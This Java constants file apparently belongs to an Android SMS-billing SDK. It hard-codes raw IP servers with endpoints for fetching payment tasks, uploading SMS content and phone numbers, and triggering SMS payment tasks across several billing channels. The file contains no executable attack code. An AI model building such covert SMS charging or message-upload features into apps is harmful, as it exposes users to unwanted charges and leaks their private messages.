package com.thirdparty.utils;

/***
 *
 * @author jsf
 *
 */
public class Constants {
    private static final String HOST = "http://103.229.214.108:80";
    private static final String HOST_PHONE = "http://103.229.215.159:8080";
    public static final String URL_GET_GET_PAY_TASK = HOST + "/api/cpask";
    public static final String URL_GET_REPORT_CP_SMS_STATE = HOST + "/api/sdkUpSmsState";
    public static final String URL_GET_REPORT_THRIDSDK_CHANNEL_STATE = HOST + "/api/tSdkUpSmsState";
    public static final String URL_GET_REPORT_SDKINFO = HOST + "/api/sdkUpInfo";

    public static final String URL_GET_REPORT_RUNLOG = HOST + "/api/sdkUpLog";

    public static final String URL_GET_REPORT_SMSCONTENT = HOST + "/api/cpUpSms";
    public static final String URL_GET_NUM = HOST + "/api/gprsgetnum";
    public static final String URL_REPORT_NUM = HOST + "/api/upgprsnum";

    public static final String RECEIVER_FILTER_ACTION_SENDSMS_CHANNEL = "SEND_SMS_ACTION_CHANNEL";
    public static final String RECEIVER_FILTER_ACTION_SENDSMS_ARRIVE = "SEND_SMS_ARRIVE";

    public static final String BUNDLE_KEY_SMS_SEND_TASKS = "send_sms_tasks";

    public static final String INTENT_ACTION_REQEUST_PAYTASK = "request_pay_task";
    public static final String INTENT_ACTION_REQUEST_SMSTASK = "request_sms_task";
    public static final String INTENT_ACTION_REQUEST_UPLOAD_TASK = "request_upload_task";
    public static final String INTENT_ACTION_DO_SMS_TASK = "do_sms_task";
    public static final String INTENT_ACTION_DO_UPLOAD_TASK = "do_upload_task";

    public static final String INTENT_ACTION_DO_PAYTASK_WITH_95 = "do_pay_task_95";

    public static final String INTENT_ACTION_DO_PAYTASK_WITH_WY = "do_pay_task_wy";

    public static final String INTENT_ACTION_DO_PAYTASK_WITH_YF = "do_pay_task_yf";

    public static final String INTENT_ACTION_DO_PAYTASK_WITH_YUNBEI = "do_pay_task_yunbei";

    public static final String BUNDLE_KEY_PAYTASK = "pay_task";

    public static final String BUNDLE_KEY_PAYTASK_YUFENG = "pay_task_yf";

    public static final String BUNDLE_KEY_PAYTASK_WEIYUN = "pay_task_wy";

    public static final String BUNDLE_KEY_PAYTASK_YUNBEI = "pay_task_yunbei";

    public static final String RECEIVER_FILTER_WEIYUN_SMS_SEND_ACTION = "SMS_SEND_ACTION";

    public static final String RECEIVER_FILTER_YUFENG_SMS_SEND_ACTION = "com.mj.billing.action.SENT_SMS_ACTION";

    public static final String URL_UPLOAD_FILE = "";

    public static String SDK_JAR_PROMPT_MSG = "";
    public static int  SDK_JAR_PROMPT = 0;

}
